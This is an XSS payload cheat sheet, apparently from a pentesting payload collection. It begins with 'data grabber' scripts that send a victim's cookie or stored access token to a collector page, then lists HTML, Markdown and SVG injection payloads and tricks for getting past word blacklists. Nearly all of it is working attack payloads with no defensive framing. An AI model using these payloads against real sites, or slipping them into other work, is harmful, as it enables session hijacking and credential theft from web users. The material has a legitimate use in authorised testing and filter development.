Data grabber for XSS
Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>

<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>

XSS in HTML/Applications

<script>alert('XSS')</script>

<scr<script>ipt>alert('XSS')</scr<script>ipt>

"><script>alert("XSS")</script>

"><script>alert(String.fromCharCode(88,83,83))</script>

<img src=x onerror=alert('XSS');>

<img src=x onerror=alert('XSS')//

<img src=x onerror=alert(String.fromCharCode(88,83,83));>

<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>

<img src=x:alert(alt) onerror=eval(src) alt=xss>

"><img src=x onerror=alert("XSS");>

"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

XSS in Markdown

[a](javascript:prompt(document.cookie))

[a](j a v a s c r i p t:prompt(document.cookie))

[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

[a](javascript:window.onerror=alert;throw%201)

XSS in SVG (short)

<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>

<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>

Bypass word blacklist with code evaluation

eval('ale'+'rt(0)');

Function('ale'+'rt(1)')();

new Function`alert`6``;

setTimeout('ale'+'rt(2)');

setInterval('ale'+'rt(10)');

Set.constructor('ale'+'rt(13)')();

Set.constructor`alert(14)```;
